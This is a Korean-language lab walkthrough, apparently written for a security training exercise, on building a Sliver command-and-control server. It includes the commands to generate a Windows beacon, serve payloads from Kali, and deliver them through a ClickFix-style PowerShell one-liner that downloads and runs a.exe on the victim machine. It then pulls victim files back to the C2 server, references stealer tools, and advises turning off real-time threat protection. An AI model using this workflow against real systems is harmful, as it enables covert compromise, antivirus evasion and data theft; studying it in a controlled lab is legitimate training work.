# Sliver C2 서버 구축

## 1. Sliver C2 설치
### 로컬 PC
[silver c2 설치 바로가기](https://github.com/BishopFox/sliver/releases/tag/v1.7.7)<br><br>
아래 파일 설치 <br>
- sliver-server_linux-amd64  <br>
- sliver-server_linux-amd64.minisig
해당 파일을 Kali로 드래그 드롭하기!!

## 2. 비콘 생성 ★★
C2 서버마다 생성한 암호키가 다르기 때문에 각자 생성 필요
```
generate beacon --http 'http://192.168.50.10:8080?force-http=true&max-errors=3' --os windows --arch amd64 --format exe --seconds 300 --jitter 0 --skip-symbols --debug --save /home/kali/Tools/sliver/output/SLIVER_LAB_BEACON.exe
```

비콘 생성 후,
1. lab_payload_runner.py 내부의 SLIVER_LAB_BEACON.exe 의 해시값 변경 후 빌드 <br>
해시값 확인하는 명령어
```
sha256sum /home/kali/Tools/sliver/output/SLIVER_LAB_BEACON.exe
```
2. kali에 세팅해둔 a.exe와 SLIVER_LAB_BEACON.exe 변경
```
pip install PyInstaller
```
```
python -m PyInstaller --onefile --windowed --name a lab_payload_runner.py
```
3. powershellcode 내 해시값 변경 : 최신화된 a.exe 파일의 해시값으로 변경

## 3. 파일 세팅
Kali에 있어야할 파일
1. a.exe
2. FileServerStealer.exe
3. FileStealer.exe
4. KisecWinApiReport.exe
5. SLIVER_LAB_BEACON.exe
6. sliver-server_linux-amd64
7. sliver-server_linux-amd64.mining

## 4. Sliver C2 실행
```
./sliver-server_linux-amd64
http --lhost 192.168.50.10 --lport 8080
```

## 5. ClickFix 실행 
### Kali
```
python3 -m http.server 8000 --bind 192.168.50.10 --directory ~/Desktop
```

### Victim PC
win + r
```
powershell -nop -c "$p=Join-Path $env:TEMP a.exe;iwr http://192.168.50.10:8000/a.exe -OutFile $p;if((Get-FileHash $p -a SHA256).Hash-eq'[a.exe 해시값 삽입]'){&$p}else{ri $p -Force}"
```
이후에 powershell 창이 꺼지면 안됨 > 만약 꺼진다면, 실시간 위협 OFF

## 6. C2 동작 확인
```
beacons
use 
download --recurse "C:/Windows/Temp/Kisec" "/home/kali/C2output"
tasks
tasks fetch <task id>
```

Pending : 5분 다운 받아오는 중..... <br>
Completed : 다운 성공 파일 전송!

## 7. 파일 추출하기
```
tasks fetch <task id>

.
.
.
┃ Choose an option:
┃   Dump Contents
┃ > Save to File ...

┃ Save to: network
[*] Wrote 734 byte(s) to network
```

이후 터미널에서 
```
# 1 자동 저장 시
cd ~/
cat C2output

# 2 경로 지정 후 저장 시
cd ~/Desktop
gzip -t [파일명]
gzip -dc [파일명] > [파일명].txt
cat [파일명].txt